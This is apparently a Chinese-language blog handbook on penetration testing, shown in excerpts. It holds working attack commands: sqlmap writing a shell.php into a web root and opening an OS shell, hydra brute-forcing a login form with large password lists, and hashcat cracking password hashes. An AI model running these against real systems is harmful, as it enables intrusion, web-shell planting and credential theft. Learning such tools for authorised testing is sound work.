---
title: "penetration-hb"
description: "from cyberspace mapping engine to shell."
date: "2024-01-20T11:32:00.000Z"
updated: "2025-01-06T01:57:37.000Z"
tags: []
draft: false
layout: "post"
slug: "recon-to-shell-handbook"
---
...
`/opt/workspace/seclists/Discovery/Web-Content/directory-list-2.3-big.txt`
...
7.   shell 操作
     ...
     3.   将本地文件上传到目标目录：`sqlmap -u "http://192.168.0.1/login" --file-write="shell.php" --file-dest="/srv/http/html/"`
     4.   获取目标 host 的交互式 shell：`sqlmap -u "http://192.168.0.1/login" --os-shell`

## hydra

用于密码爆破，get src here [vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra.git)，`sudo apt install hydra`；`/opt/workspace/seclists/Passwords/xato-net-10-million-passwords-1000000.txt`；
...
4.   对表单进行爆破，使用 3 个 `:` 来区分 http-post-form 区域，分别表示目标页面、有效参数、失败提示（尝试先指定 `-d` 尝试获取有效 RECV response，再根据输出判断 fail content）：
     ...
     ```bash
     hydra -l admin \
     -P /opt/workspace/seclists/Passwords/xato-net-10-million-passwords-1000000.txt \
     -s 81 \
     127.0.0.1 \
...
src here：[hashcat/hashcat](https://github.com/hashcat/hashcat.git)；`sudo apt install hashcat`；hashcat 支持的 hash 爆破巨多，输入 `hashcat --help` 可以查看，但是性能需求较大，wsl 给的运存较小，如果用 vmware，给个 8GB 差不多了，越大越好；`/opt/workspace/seclists/Passwords/xato-net-10-million-passwords-1000000.txt`
...
$ hashcat -m 500 -a 0 -O -o pwned.txt crack.txt /opt/workspace/seclists/Passwords/darkc0de.txt
Session..........: hashcat
Status...........: Exhausted
